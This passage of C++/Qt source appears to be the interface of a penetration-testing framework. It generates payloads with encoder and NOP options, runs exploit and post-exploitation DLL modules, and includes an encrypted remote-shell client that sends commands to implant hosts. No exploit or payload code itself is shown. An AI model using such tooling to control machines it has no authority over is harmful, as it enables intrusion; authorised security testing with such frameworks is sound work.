        const std::shared_ptr<PayloadShellSession> Session = PayloadShellSessionForItem(ShellState, Item);
        if (!Session)
            return;
        if (ShellState->HostEdit)
            ShellState->HostEdit->setText(Session->Host);
        if (ShellState->PortEdit)
            ShellState->PortEdit->setText(Session->Port);
        if (ShellState->PasswordEdit)
            ShellState->PasswordEdit->setText(Session->Password);
        PayloadShellRefreshHostList(ShellState);
    };
    SaveSelectedHost = [ShellState, ShellPage] {
        if (!ShellState->HostList || !ShellState->HostList->currentItem())
            return false;
        const std::shared_ptr<PayloadShellSession> Session = PayloadShellCurrentSession(ShellState);
        if (!Session)
            return false;

        const QString Host = ShellState->HostEdit ? ShellState->HostEdit->text().trimmed() : QString();
        const QString Port = ShellState->PortEdit ? ShellState->PortEdit->text().trimmed() : QString();
        if (Host.isEmpty())
        {
            ShowWarningNotice(ShellPage, "Payload Shell", "Host is required.");
            return false;
        }

        auto *Item = ShellState->HostList->currentItem();
        Session->Host = Host;
        Session->Port = Port;
        Session->Password = ShellState->PasswordEdit ? ShellState->PasswordEdit->text() : QString();
        Item->setData(KPayloadShellRoleHost, Session->Host);
        Item->setData(KPayloadShellRolePort, Session->Port);
        Item->setData(KPayloadShellRolePassword, Session->Password);
        PayloadShellRefreshHostList(ShellState);
        PayloadShellUpdateCommandWindowTitle(Session);
        PayloadShellPersistConfiguration(ShellState);
        return true;
    };

    const QJsonObject PayloadShellObject = ConfigurationSection("PayloadShell");
    const QJsonArray SavedHosts = PayloadShellObject.value("Hosts").toArray();
    if (SavedHosts.isEmpty())
    {
        HostList->addItem(CreateHostItem(ConfigurationValue("PayloadShell", "Host", "127.0.0.1").toString(),
                                         ConfigurationValue("PayloadShell", "Port", "4444").toString()));
    }
    else
    {
        for (const QJsonValue &Value : SavedHosts)
        {
            const QJsonObject HostObject = Value.toObject();
            const QString Host = HostObject.value("Host").toString().trimmed();
            if (Host.isEmpty())
                continue;
            HostList->addItem(CreateHostItem(Host, HostObject.value("Port").toString().trimmed()));
        }
        if (HostList->count() == 0)
            HostList->addItem(CreateHostItem("127.0.0.1", "4444"));
    }
    HostList->setCurrentRow(std::clamp(PayloadShellObject.value("SelectedHost").toInt(), 0, std::max(0, HostList->count() - 1)));
    LoadHostToEditors(HostList->currentItem());

    std::function<void(const std::shared_ptr<PayloadShellSession> &, const QString &, const QColor &)> FinalizeSession;
    std::function<void(bool)> DisconnectShell;
    std::function<void(const std::shared_ptr<PayloadShellSession> &, const QString &)> SendShellCommand;
    FinalizeSession = [ShellState](const std::shared_ptr<PayloadShellSession> &Session, const QString &StatusText,
                                   const QColor &Color) {
        if (!Session)
            return;
        QPointer<QTcpSocket> Socket = Session->Socket;
        if (Socket)
        {
            Socket->disconnect();
            Socket->deleteLater();
            if (Session->Socket == Socket)
                Session->Socket = nullptr;
        }
        PayloadShellResetConnectionState(Session);
        PayloadShellSetStatus(Session, StatusText, Color);
        PayloadShellUpdateControls(ShellState);
    };
    DisconnectShell = [ShellState, ShellPage, FinalizeSession](bool SendExit) {
        const std::shared_ptr<PayloadShellSession> Session = PayloadShellCurrentSession(ShellState);
        if (!Session || !Session->Socket)
        {
            FinalizeSession(Session, "Disconnected", QColor("#8A94A6"));
            return;
        }
        Session->DisconnectRequested = true;
        if (SendExit && !Session->SessionKey.isEmpty())
        {
            QString Error;
            PayloadShellSendEncrypted(Session, "exit", &Error);
        }
        QPointer<QTcpSocket> Socket = Session->Socket;
        Socket->disconnectFromHost();
        QTimer::singleShot(300, ShellPage, [Socket] {
            if (Socket && Socket->state() != QAbstractSocket::UnconnectedState)
                Socket->abort();
        });
    };
    SendShellCommand = [ShellState](const std::shared_ptr<PayloadShellSession> &Session, const QString &OverrideCommand) {
        if (!Session)
            return;
        const bool UseOverride = !OverrideCommand.isNull();
        const QString Command = (UseOverride
                                     ? OverrideCommand
                                     : (Session->CommandEdit ? Session->CommandEdit->text() : QString()))
                                    .trimmed();
        if (Command.isEmpty())
            return;
        if (Session->SessionKey.isEmpty())
        {
            PayloadShellLog(Session, "Not connected!", QColor("#FF5F56"));
            return;
        }
        if (Session->Authenticating || !Session->PendingCommand.isEmpty())
        {
            PayloadShellLog(Session, "Wait for the current command to finish.", QColor("#F4BF4F"));
            return;
        }
        if (!UseOverride && Session->CommandEdit)
            Session->CommandEdit->clear();
        PayloadShellLog(Session, "> " + Command, QColor("#F4BF4F"));
        QString Error;
        if (!PayloadShellSendEncrypted(Session, Command, &Error))
        {
            PayloadShellLog(Session, "Send failed: " + Error, QColor("#FF5F56"));
            if (Session->Socket)
                Session->Socket->disconnectFromHost();
            return;
        }
        Session->PendingCommand = Command;
        PayloadShellUpdateControls(ShellState);
    };

    for (const auto &[Id, Session] : ShellState->Sessions)
    {
        Q_UNUSED(Id);
        PayloadShellSetStatus(Session, "Disconnected", QColor("#8A94A6"));
        PayloadShellLog(Session, "Remote control client ready.", QColor("#4FC3F7"));
    }
    PayloadShellUpdateControls(ShellState);

    const auto PopulateModules = [Modules, Information] {
        const QString PreviousPath = Modules->currentData().toString();
        Modules->blockSignals(true);
        Modules->clear();
        int SelectedIndex = -1;
        int Index = 0;
        for (ModuleEntry *Module : ModulesByCategory("Payload", true))
        {
            const QString Path = QString::fromStdString(Module->Path);
            Modules->addItem(QString::fromStdString(Module->Name), Path);
            if (Path == PreviousPath)
                SelectedIndex = Index;
            ++Index;
        }
        if (Modules->count() == 0)
        {
            Modules->addItem("No payload module", QString());
            Modules->setEnabled(false);
            Information->setText("No payload module is available.");
        }
        else
        {
            Modules->setEnabled(true);
            Modules->setCurrentIndex(SelectedIndex >= 0 ? SelectedIndex : 0);
        }
        Modules->blockSignals(false);
    };
    const auto IsBuiltInPayloadOption = [](const std::string &Name) {
        return OptionNameMatches(Name, {"FilePath", "File_Path", "Output", "OutputPath", "Path", "File", "FileName",
                                        "Encoder", "Encoder_Module", "Nop", "Nop_Module"});
    };
    const auto PopulateAdditionalParameters = [Modules, Parameters, IsBuiltInPayloadOption, SetPayloadOption] {
        Parameters->setRowCount(0);
        ModuleEntry *Entry = FindDllModule(Modules->currentData().toString());
        if (!Entry)
            return;

        QString Error;
        if (!LoadModuleInstance(*Entry, &Error))
            return;

        auto *Instance = static_cast<ModuleBase *>(Entry->ModuleInstance);
        const auto &ModuleOptions = Instance->GetOptions();
        int VisibleCount = 0;
        for (const auto &[Name, OptionPointer] : ModuleOptions)
        {
            Q_UNUSED(OptionPointer);
            if (!IsBuiltInPayloadOption(Name))
                ++VisibleCount;
        }

        Parameters->setRowCount(VisibleCount);
        int Row = 0;
        const QString Path = Modules->currentData().toString();
        for (const auto &[Name, OptionPointer] : ModuleOptions)
        {
            if (IsBuiltInPayloadOption(Name))
                continue;

            const bool Required = OptionPointer->GetRequired() == OptionRequired::Required;
            auto *NameItem = new QTableWidgetItem(QString::fromStdString(Name) + (Required ? " *" : ""));
            NameItem->setToolTip(QString::fromStdString(OptionPointer->GetDescription()));
            Parameters->setItem(Row, 0, NameItem);
            Parameters->setItem(Row, 1, new QTableWidgetItem(QString::fromStdString(OptionPointer->TypeName())));
            Parameters->setItem(Row, 3, new QTableWidgetItem(QString::fromStdString(OptionPointer->GetDescription())));

            const QString InitialValue = QString::fromStdString(OptionPointer->GetValue());
            const QString OptionName = QString::fromStdString(Name);
            if (auto *EnumOption = dynamic_cast<OptEnum *>(OptionPointer.get()))
            {
                auto *Editor = new ComboBox;
                for (const std::string &Choice : EnumOption->GetChoices())
                    Editor->addItem(QString::fromStdString(Choice));
                Editor->setCurrentText(InitialValue);
                QObject::connect(Editor, &ComboBox::currentTextChanged, Editor,
                                 [Path, OptionName, SetPayloadOption](const QString &Value) {
                    if (ModuleEntry *Module = FindDllModule(Path))
                        SetPayloadOption(Module, {OptionName}, Value);
                });
                Parameters->setCellWidget(Row, 2, Editor);
            }
            else if (dynamic_cast<OptBool *>(OptionPointer.get()))
            {
                auto *Editor = new ComboBox;
                Editor->addItems({"true", "false"});
                Editor->setCurrentText(InitialValue.compare("false", Qt::CaseInsensitive) == 0 ? "false" : "true");
                QObject::connect(Editor, &ComboBox::currentTextChanged, Editor,
                                 [Path, OptionName, SetPayloadOption](const QString &Value) {
                    if (ModuleEntry *Module = FindDllModule(Path))
                        SetPayloadOption(Module, {OptionName}, Value);
                });
                Parameters->setCellWidget(Row, 2, Editor);
            }
            else
            {
                auto *Editor = new LineEdit;
                Editor->setText(InitialValue);
                Editor->setPlaceholderText(QString::fromStdString(OptionPointer->GetDefaultValue()));
                QObject::connect(Editor, &QLineEdit::textChanged, Editor,
                                 [Path, OptionName, SetPayloadOption](const QString &Value) {
                    if (ModuleEntry *Module = FindDllModule(Path))
                        SetPayloadOption(Module, {OptionName}, Value);
                });
                Parameters->setCellWidget(Row, 2, Editor);
            }

            Parameters->setRowHeight(Row, 42);
            ++Row;
        }
    };
    const auto UpdateInformation = [Modules, Information, OutputPath, PopulateAdditionalParameters] {
        ModuleEntry *Entry = FindDllModule(Modules->currentData().toString());
        if (!Entry)
        {
            Information->setText("No payload module is available.");
            OutputPath->clear();
            PopulateAdditionalParameters();
            return;
        }
        const QString FilePath = CachedModuleOptionValue(
            *Entry, {"FilePath", "File_Path", "Output", "OutputPath", "Path", "File", "FileName"});
        if (OutputPath->text() != FilePath)
            OutputPath->setText(FilePath);
        Information->setText(
            QString("Payload/%1  |  Author: %2\n%3")
                .arg(QString::fromStdString(Entry->Name), QString::fromStdString(Entry->Author),
                     QString::fromStdString(Entry->Description)));
        PopulateAdditionalParameters();
    };

    QObject::connect(Tabs, &TabBar::currentChanged, Pages, &QStackedWidget::setCurrentIndex);
    QObject::connect(Pages, &QStackedWidget::currentChanged, Tabs, &TabBar::setCurrentIndex);
    QObject::connect(Modules, &ComboBox::currentIndexChanged, Page, [UpdateInformation](int) { UpdateInformation(); });
    QObject::connect(RefreshModules, &QPushButton::clicked, Page, [Page, PopulateModules, UpdateInformation] {
        if (ModuleRunning.load())
        {
            ShowWarningNotice(Page, "Payload", "Wait for the running module to finish before refreshing.");
            return;
        }
        ScanRuntimeModules();
        PopulateModules();
        UpdateInformation();
        ShowSuccessNotice(Page, "Payload", "Payload module list refreshed.");
    });
    QObject::connect(Browse, &QPushButton::clicked, Page, [Page, OutputPath] {
        const QString Path = QFileDialog::getSaveFileName(Page, "Select output file", OutputPath->text(),
                                                          "All files (*.*)");
        if (!Path.isEmpty())
            OutputPath->setText(Path);
    });
    QObject::connect(OutputPath, &QLineEdit::textChanged, Page, [Modules, SetPayloadOption](const QString &Value) {
        ModuleEntry *Entry = FindDllModule(Modules->currentData().toString());
        SetPayloadOption(Entry, {"FilePath", "File_Path", "Output", "OutputPath", "Path", "File", "FileName"},
                         Value.trimmed());
    });
    QObject::connect(OutputButton, &QPushButton::clicked, Page, [Page] {
        ShowModuleOutputDialog(Page, "Payload Output");
    });
    QObject::connect(Generate, &QPushButton::clicked, Page, [Page, Modules, Encoder, Nop, OutputPath,
                                                             SetPayloadOption] {
        ModuleEntry *Entry = FindDllModule(Modules->currentData().toString());
        if (!Entry)
        {
            ShowWarningNotice(Page, "Payload", "No payload module is selected.");
            return;
        }
        QString Error;
        if (!LoadModuleInstance(*Entry, &Error))
        {
            ShowErrorNotice(Page, "Payload", Error);
            return;
        }
        const QString EncoderName = Encoder->currentIndex() > 0 ? Encoder->currentText().trimmed() : QString();
        const QString NopName = Nop->currentIndex() > 0 ? Nop->currentText().trimmed() : QString();
        SetPayloadOption(Entry, {"Encoder", "Encoder_Module"}, EncoderName);
        SetPayloadOption(Entry, {"Nop", "Nop_Module"}, NopName);
        SetPayloadOption(Entry, {"FilePath", "File_Path", "Output", "OutputPath", "Path", "File", "FileName"},
                         OutputPath->text().trimmed());
        if (StartModuleExecution(Entry, nullptr))
            ShowSuccessNotice(Page, "Payload", "Payload generation started.");
        else
            ShowWarningNotice(Page, "Payload", "A module is already running.");
    });
    QObject::connect(HostList, &QListWidget::currentItemChanged, ShellPage,
                     [LoadHostToEditors, ShellState](QListWidgetItem *Current, QListWidgetItem *) {
        LoadHostToEditors(Current);
        PayloadShellPersistConfiguration(ShellState);
        PayloadShellUpdateControls(ShellState);
    });
    QObject::connect(NewHostButton, &QPushButton::clicked, ShellPage, [ShellState, HostList, LoadHostToEditors] {
        auto *Item = new QListWidgetItem;
        PayloadShellCreateSession(ShellState, Item, "127.0.0.1", "4444", QString());
        HostList->addItem(Item);
        HostList->setCurrentItem(Item);
        PayloadShellRefreshHostList(ShellState);
        LoadHostToEditors(Item);
        PayloadShellPersistConfiguration(ShellState);
        PayloadShellUpdateControls(ShellState);
    });
    QObject::connect(SaveHostButton, &QPushButton::clicked, ShellPage, [SaveSelectedHost] {
        SaveSelectedHost();
    });
    QObject::connect(RemoveHostButton, &QPushButton::clicked, ShellPage,
                     [ShellState, HostList, LoadHostToEditors] {
        if (!HostList->currentItem() || HostList->count() <= 1)
            return;
        const int Row = HostList->currentRow();
        QListWidgetItem *Item = HostList->takeItem(Row);
        if (const std::shared_ptr<PayloadShellSession> Session = PayloadShellSessionForItem(ShellState, Item))
        {
            if (Session->Socket)
                Session->Socket->abort();
            if (Session->CommandDialog)
                Session->CommandDialog->close();
            ShellState->Sessions.erase(Session->Id);
        }
        delete Item;
        HostList->setCurrentRow(std::clamp(Row, 0, HostList->count() - 1));
        LoadHostToEditors(HostList->currentItem());
        PayloadShellPersistConfiguration(ShellState);
        PayloadShellUpdateControls(ShellState);
    });
    QObject::connect(HostEdit, &QLineEdit::editingFinished, ShellPage, [SaveSelectedHost] {
        SaveSelectedHost();
    });
    QObject::connect(PortEdit, &QLineEdit::editingFinished, ShellPage, [SaveSelectedHost] {
        SaveSelectedHost();
    });
    QObject::connect(PasswordEdit, &QLineEdit::editingFinished, ShellPage, [SaveSelectedHost] {
        SaveSelectedHost();
    });
    QObject::connect(CommandButton, &QPushButton::clicked, ShellPage, [ShellState, SendShellCommand] {
        const std::shared_ptr<PayloadShellSession> Session = PayloadShellCurrentSession(ShellState);
        ShowPayloadShellCommandDialog(Session, [Session, SendShellCommand](const QString &Command) {
            SendShellCommand(Session, Command);
        });
    });
    QObject::connect(ConnectButton, &QPushButton::clicked, ShellPage,
                     [ShellState, ShellPage, FinalizeSession, SaveSelectedHost] {
        const std::shared_ptr<PayloadShellSession> Session = PayloadShellCurrentSession(ShellState);
        if (!Session || Session->Socket)
            return;

        if (!SaveSelectedHost())
            return;

        const QString Host = Session->Host.trimmed();
        bool PortOk = false;
        const quint16 Port = Session->Port.trimmed().toUShort(&PortOk);
        if (Host.isEmpty())
        {
            ShowWarningNotice(ShellPage, "Payload Shell", "Host is required.");
            return;
        }
        if (!PortOk || Port == 0)
        {
            ShowWarningNotice(ShellPage, "Payload Shell", "Port must be between 1 and 65535.");
            return;
        }

        PayloadShellResetConnectionState(Session);
        auto *Socket = new QTcpSocket(ShellPage);
        Session->Socket = Socket;
        Session->ReadState = PayloadShellReadState::AwaitChallenge;
        PayloadShellSetStatus(Session, "Connecting...", QColor("#4FC3F7"));
        PayloadShellUpdateControls(ShellState);

        QObject::connect(Socket, &QTcpSocket::connected, ShellPage, [ShellState, Session, Host, Port] {
            PayloadShellLog(Session, QString("Connected to %1:%2, waiting for challenge.")
                                         .arg(Host)
                                         .arg(Port),
                            QColor("#4FC3F7"));
            PayloadShellSetStatus(Session, "Negotiating...", QColor("#4FC3F7"));
            PayloadShellUpdateControls(ShellState);
        });
        QObject::connect(Socket, &QTcpSocket::readyRead, ShellPage, [ShellState, Session, Socket] {
            if (Session->Socket != Socket)
                return;
            Session->ReceiveBuffer.append(Socket->readAll());
            PayloadShellProcessBuffer(ShellState, Session);
        });
        QObject::connect(Socket, &QTcpSocket::disconnected, ShellPage, [Session, Socket, FinalizeSession] {
            if (Session->Socket != Socket)
                return;
            FinalizeSession(Session, "Disconnected", QColor("#8A94A6"));
        });
        QObject::connect(Socket, &QTcpSocket::errorOccurred, ShellPage,
                         [Session, Socket, FinalizeSession](QAbstractSocket::SocketError Error) {
            if (Session->Socket != Socket)
                return;
            if (!Session->DisconnectRequested || Error != QAbstractSocket::RemoteHostClosedError)
                PayloadShellLog(Session, "Connection error: " + Socket->errorString(),
                                QColor("#FF5F56"));
            FinalizeSession(Session, Session->DisconnectRequested ? "Disconnected" : "Connection failed",
                            Session->DisconnectRequested ? QColor("#8A94A6")
                                                         : QColor("#FF5F56"));
        });
        Socket->connectToHost(Host, Port);
    });
    QObject::connect(DisconnectButton, &QPushButton::clicked, ShellPage, [DisconnectShell] {
        DisconnectShell(true);
    });
    QObject::connect(ShellPage, &QObject::destroyed, qApp, [ShellState] {
        for (auto &[Id, Session] : ShellState->Sessions)
        {
            Q_UNUSED(Id);
            if (Session->Socket)
                Session->Socket->abort();
            if (Session->CommandDialog)
                Session->CommandDialog->close();
        }
    });

    auto *StateTimer = new QTimer(Page);
    QObject::connect(StateTimer, &QTimer::timeout, Page, [Page, Modules, Generate] {
        if (!Page->isVisible())
            return;
        const QString Path = Modules->currentData().toString();
        Generate->setText(ModuleRunning.load() && RunningModulePath == Path ? "Running..." : "Generate");
        Generate->setEnabled(!Path.isEmpty() && !ModuleRunning.load());
    });
    StateTimer->start(150);

    PopulateModules();
    UpdateInformation();
    return Page;
}

QWidget *CreateModuleRunPage()
{
    auto *Page = new QWidget;
    auto *Layout = new QVBoxLayout(Page);
    ConfigurePageLayout(Layout, 14);

    auto *Toolbar = new QHBoxLayout;
    ConfigureToolbarLayout(Toolbar);
    auto *Categories = new ComboBox;
    Categories->addItems({"All", "Exploit", "Auxiliary", "Post"});
    Categories->setCurrentIndex(0);
    Categories->setMinimumWidth(150);
    auto *Modules = new ComboBox;
    Modules->setCurrentIndex(0);
    Modules->setMinimumWidth(300);
    auto *Refresh = MakeButton("Refresh");
    auto *Execute = MakeButton("Run", true);
    auto *Stop = MakeButton("Stop");
    Toolbar->addWidget(Categories);
    Toolbar->addWidget(Modules);
    Toolbar->addStretch();
    Toolbar->addWidget(Refresh);
    Toolbar->addWidget(Stop);
    Toolbar->addWidget(Execute);
    Layout->addLayout(Toolbar);

    auto *Information = new BodyLabel("Select a module to configure its call controls.");
    Information->setWordWrap(true);
    Information->setMinimumHeight(42);
    Layout->addWidget(Information);

    auto *Options = new TableWidget;
    InstallFluentScrollBar(Options, Qt::Vertical);
    InstallFluentScrollBar(Options, Qt::Horizontal);
    Options->setColumnCount(4);
    Options->setRowCount(0);
    Options->setHorizontalHeaderLabels({"Option", "Type", "Value", "Description"});
    Options->horizontalHeader()->setSectionResizeMode(0, QHeaderView::ResizeToContents);
    Options->horizontalHeader()->setSectionResizeMode(1, QHeaderView::ResizeToContents);
    Options->horizontalHeader()->setSectionResizeMode(2, QHeaderView::Stretch);
    Options->horizontalHeader()->setSectionResizeMode(3, QHeaderView::Stretch);
    Options->verticalHeader()->hide();
    Options->setSelectionMode(QAbstractItemView::NoSelection);
    Options->setEditTriggers(QAbstractItemView::NoEditTriggers);
    Options->setMinimumHeight(180);

    auto *OutputToolbar = new QHBoxLayout;
    ConfigureToolbarLayout(OutputToolbar);
    auto *OutputButton = MakeButton("Module Output");
    OutputButton->setSizePolicy(QSizePolicy::Maximum, QSizePolicy::Preferred);
    OutputToolbar->addWidget(OutputButton);
    OutputToolbar->addStretch();
    Layout->addWidget(Options, 1);
    Layout->addLayout(OutputToolbar);
    QObject::connect(OutputButton, &QPushButton::clicked, Page, [Page] {
        ShowModuleOutputDialog(Page, "Module Output");
    });

    const auto PopulateOptions = [Modules, Options, Information, Execute, Stop] {
        Options->setRowCount(0);
        const QString Path = Modules->currentData().toString();
        ModuleEntry *Entry = FindDllModule(Path);
        Execute->setEnabled(false);
        Stop->setEnabled(false);
        if (!Entry)
        {
            Information->setText("Select a module to configure its call controls.");
            return;
        }

        QString Error;
        if (!LoadModuleInstance(*Entry, &Error))
        {
            Information->setText("Failed to load module: " + Error + "\n" + Path);
            return;
        }
        ModuleBase *Instance = static_cast<ModuleBase *>(Entry->ModuleInstance);
        const ModuleInfo Info = Instance->Info();
        Information->setText(QString("%1/%2  |  Author: %3  |  Target: %4\n%5")
                                 .arg(QString::fromStdString(ModuleTypeToString(Info.Type)),
                                      QString::fromStdString(Info.Name),
                                      QString::fromStdString(Info.Author.empty() ? Entry->Author : Info.Author),
                                      QString::fromStdString(Info.DefaultTarget.empty() ? "Unknown" : Info.DefaultTarget),
                                      QString::fromStdString(Info.Description.empty() ? Entry->Description : Info.Description)));

        const auto &ModuleOptions = Instance->GetOptions();
        Options->setRowCount(static_cast<int>(ModuleOptions.size()));
        int Row = 0;
        for (const auto &[Name, OptionPointer] : ModuleOptions)
        {
            const bool Required = OptionPointer->GetRequired() == OptionRequired::Required;
            auto *NameItem = new QTableWidgetItem(QString::fromStdString(Name) + (Required ? " *" : ""));
            NameItem->setToolTip(QString::fromStdString(OptionPointer->GetDescription()));
            Options->setItem(Row, 0, NameItem);
            Options->setItem(Row, 1, new QTableWidgetItem(QString::fromStdString(OptionPointer->TypeName())));
            Options->setItem(Row, 3, new QTableWidgetItem(QString::fromStdString(OptionPointer->GetDescription())));

            const QString InitialValue = QString::fromStdString(OptionPointer->GetValue());
            if (auto *EnumOption = dynamic_cast<OptEnum *>(OptionPointer.get()))
            {
                auto *Editor = new ComboBox;
                for (const std::string &Choice : EnumOption->GetChoices())
                    Editor->addItem(QString::fromStdString(Choice));
                Editor->setCurrentText(InitialValue);
                QObject::connect(Editor, &ComboBox::currentTextChanged, Editor, [Path, Name](const QString &Value) {
                    if (ModuleEntry *Module = FindDllModule(Path); Module && Module->ModuleInstance)
                        static_cast<ModuleBase *>(Module->ModuleInstance)->SetOption(Name, Utf8Bytes(Value));
                });
                Options->setCellWidget(Row, 2, Editor);
            }
            else if (dynamic_cast<OptBool *>(OptionPointer.get()))
            {
                auto *Editor = new ComboBox;
                Editor->addItems({"true", "false"});
                Editor->setCurrentText(InitialValue.compare("false", Qt::CaseInsensitive) == 0 ? "false" : "true");
                QObject::connect(Editor, &ComboBox::currentTextChanged, Editor, [Path, Name](const QString &Value) {
                    if (ModuleEntry *Module = FindDllModule(Path); Module && Module->ModuleInstance)
                        static_cast<ModuleBase *>(Module->ModuleInstance)->SetOption(Name, Utf8Bytes(Value));
                });
                Options->setCellWidget(Row, 2, Editor);
            }
            else
            {
                auto *Editor = new LineEdit;
                Editor->setText(InitialValue);
                Editor->setPlaceholderText(QString::fromStdString(OptionPointer->GetDefaultValue()));
                QObject::connect(Editor, &QLineEdit::textChanged, Editor, [Path, Name](const QString &Value) {
                    if (ModuleEntry *Module = FindDllModule(Path); Module && Module->ModuleInstance)
                        static_cast<ModuleBase *>(Module->ModuleInstance)->SetOption(Name, Utf8Bytes(Value));
                });
                Options->setCellWidget(Row, 2, Editor);
            }
            Options->setRowHeight(Row, 42);
            ++Row;
        }
        Execute->setEnabled(!ModuleRunning.load());
        Stop->setEnabled(ModuleRunning.load() && RunningModulePath == Path);
    };

    const auto PopulateModules = [Categories, Modules, PopulateOptions] {
        Modules->blockSignals(true);
        Modules->clear();
        Modules->addItem("Select module", QString());
        const QString Category = Categories->currentText();
        for (ModuleEntry *Module : ModulesByCategory(Category))
        {
            const QString Path = QString::fromStdString(Module->Path);
            Modules->addItem(QString::fromStdString(Module->Category + "/" + Module->Name), Path);
        }
        Modules->setCurrentIndex(0);
        Modules->blockSignals(false);
        PopulateOptions();
    };

    QObject::connect(Categories, &ComboBox::currentTextChanged, Page, [PopulateModules](const QString &) {
        PopulateModules();
    });
    QObject::connect(Modules, &ComboBox::currentIndexChanged, Page, [PopulateOptions](int) {
        PopulateOptions();
    });
    QObject::connect(Refresh, &QPushButton::clicked, Page, [Page, PopulateModules] {
        if (ModuleRunning.load())
        {
            ShowWarningNotice(Page, "ModuleRun", "Wait for the running module to finish before refreshing.");
            return;
        }
        ScanRuntimeModules();
        PopulateModules();
        ShowSuccessNotice(Page, "ModuleRun", "Module list refreshed.");
    });
    QObject::connect(Execute, &QPushButton::clicked, Page, [Modules, Page] {
        ModuleEntry *Entry = FindDllModule(Modules->currentData().toString());
        if (!Entry)
            return;
        if (!Entry->ModuleInstance)
        {
            QString Error;
            if (!LoadModuleInstance(*Entry, &Error))
            {
                ShowErrorNotice(Page, "ModuleRun", Error);
                return;
            }
        }
        if (StartModuleExecution(Entry, nullptr))
            ShowSuccessNotice(Page, "ModuleRun", "Module execution started.");
    });
    QObject::connect(Stop, &QPushButton::clicked, Page, [Modules] {
        ModuleEntry *Entry = FindDllModule(Modules->currentData().toString());
        if (!Entry || !Entry->Handle || RunningModulePath != QString::fromStdString(Entry->Path))
        {
            AppendModuleOutput("[!] No running module.\n");
            return;
        }
        const auto StopModule = reinterpret_cast<void (*)()>(GetProcAddress(Entry->Handle, "StopModule"));
        if (!StopModule)
        {
            AppendModuleOutput("[!] StopModule export not found; cannot signal module.\n");
            return;
        }
        StopModule();
        AppendModuleOutput("[*] Stop requested.\n");
        ShowSuccessNotice(qobject_cast<QWidget *>(Modules->window()), "ModuleRun", "Stop request sent.");
    });

    auto *StateTimer = new QTimer(Page);
    QObject::connect(StateTimer, &QTimer::timeout, Page, [Page, Modules, Execute, Stop] {
        if (!Page->isVisible())
            return;
        const QString Path = Modules->currentData().toString();
        Execute->setEnabled(!Path.isEmpty() && !ModuleRunning.load());
        Stop->setEnabled(!Path.isEmpty() && ModuleRunning.load() && RunningModulePath == Path);
    });
    StateTimer->start(150);
    PopulateModules();
    return Page;
}

QWidget *CreateConsolePage()
{
    auto *Page = new QWidget;
    auto *Layout = new QVBoxLayout(Page);
    ConfigurePageLayout(Layout, 10);
    auto *Output = new PlainTextEdit;
    InstallFluentScrollBar(Output, Qt::Vertical);
    Output->setReadOnly(true);
    Output->setFont(QFont("Cascadia Mono", 10));
    Output->setPlainText(ConsoleOutputSnapshot());
    ConsoleOutputWidget = Output;
    Layout->addWidget(Output, 1);
    auto *CommandLayout = new QHBoxLayout;
    ConfigureToolbarLayout(CommandLayout);
    auto *Command = new LineEdit;
    Command->setPlaceholderText("Type a command and press Enter");
    auto *Run = MakeButton("Run", true);
    auto *Clear = MakeButton("Clear");
    auto *Copy = MakeButton("Copy");
    auto *Interrupt = MakeButton("Ctrl+C");
    CommandLayout->addWidget(Command, 1);
    CommandLayout->addWidget(Clear);
    CommandLayout->addWidget(Copy);
    CommandLayout->addWidget(Interrupt);
    CommandLayout->addWidget(Run);
    Layout->addLayout(CommandLayout);

    const auto ExecuteCommand = [Page, Command, Run, Interrupt] {
        const QString Text = Command->text().trimmed();
        if (Text.isEmpty() || ActiveConsoleProcess)
            return;
        Command->clear();
        AppendConsoleOutput("console> " + Text + "\n");
        auto *Process = new QProcess(Page);
        ActiveConsoleProcess = Process;
        Process->setProcessChannelMode(QProcess::SeparateChannels);
        Process->setProgram("cmd.exe");
        Process->setArguments({"/d", "/s", "/c", QStringLiteral("chcp 65001>nul & ") + Text});
        Run->setEnabled(false);
        Interrupt->setEnabled(true);
        QObject::connect(Process, &QProcess::readyReadStandardOutput, Process, [Process] {
            const QByteArray Bytes = Process->readAllStandardOutput();
            if (!Bytes.isEmpty())
                AppendConsoleOutput(DecodeConsoleProcessOutput(Bytes));
        });
        QObject::connect(Process, &QProcess::readyReadStandardError, Process, [Process] {
            const QByteArray Bytes = Process->readAllStandardError();
            if (!Bytes.isEmpty())
                AppendConsoleOutput(DecodeConsoleProcessOutput(Bytes));
        });
        QObject::connect(Process, &QProcess::errorOccurred, Process, [Process](QProcess::ProcessError) {
            AppendConsoleOutput("[!] " + Process->errorString() + "\n");
        });
        QObject::connect(Process, qOverload<int, QProcess::ExitStatus>(&QProcess::finished), Process,
                         [Page, Process, Run, Interrupt](int ExitCode, QProcess::ExitStatus Status) {
            const QByteArray RemainingStdout = Process->readAllStandardOutput();
            if (!RemainingStdout.isEmpty())
                AppendConsoleOutput(DecodeConsoleProcessOutput(RemainingStdout));
            const QByteArray RemainingStderr = Process->readAllStandardError();
            if (!RemainingStderr.isEmpty())
                AppendConsoleOutput(DecodeConsoleProcessOutput(RemainingStderr));
            if (Status == QProcess::CrashExit)
            {
                AppendConsoleOutput(QString("[!] Command process terminated (exit code %1).\n").arg(ExitCode));
                ShowErrorNotice(Page, "Console", QString("Command terminated with exit code %1.").arg(ExitCode));
            }
            else if (ExitCode == 0)
                ShowSuccessNotice(Page, "Console", "Command completed successfully.");
            else
            {
                AppendConsoleOutput(QString("[!] Command exited with code %1.\n").arg(ExitCode));
                ShowErrorNotice(Page, "Console", QString("Command completed with exit code %1.").arg(ExitCode));
            }
            ActiveConsoleProcess = nullptr;
            Run->setEnabled(true);
            Interrupt->setEnabled(false);
            Process->deleteLater();
        });
        Process->start();
    };
    QObject::connect(Command, &QLineEdit::returnPressed, Page, ExecuteCommand);
    QObject::connect(Run, &QPushButton::clicked, Page, ExecuteCommand);
    QObject::connect(Clear, &QPushButton::clicked, Page, [Page] { ClearConsoleOutput(); ShowSuccessNotice(Page, "Console", "Console cleared."); });
    QObject::connect(Copy, &QPushButton::clicked, Page, [Page] {
        qApp->clipboard()->setText(ConsoleOutputSnapshot());
        AppendConsoleOutput("[*] Copied transcript to clipboard.\n");
        ShowSuccessNotice(Page, "Console", "Transcript copied to the clipboard.");
    });
    QObject::connect(Interrupt, &QPushButton::clicked, Page, [] {
        if (!ActiveConsoleProcess)
        {
            AppendConsoleOutput("[!] No command is running.\n");
            return;
        }
        AppendConsoleOutput("[*] Ctrl+C requested.\n");
        ShowSuccessNotice(QApplication::activeWindow(), "Console", "Interrupt request sent.");
        ActiveConsoleProcess->terminate();
        QPointer<QProcess> Process = ActiveConsoleProcess;
        QTimer::singleShot(1000, qApp, [Process] {
            if (Process && Process->state() != QProcess::NotRunning)
                Process->kill();
        });
    });
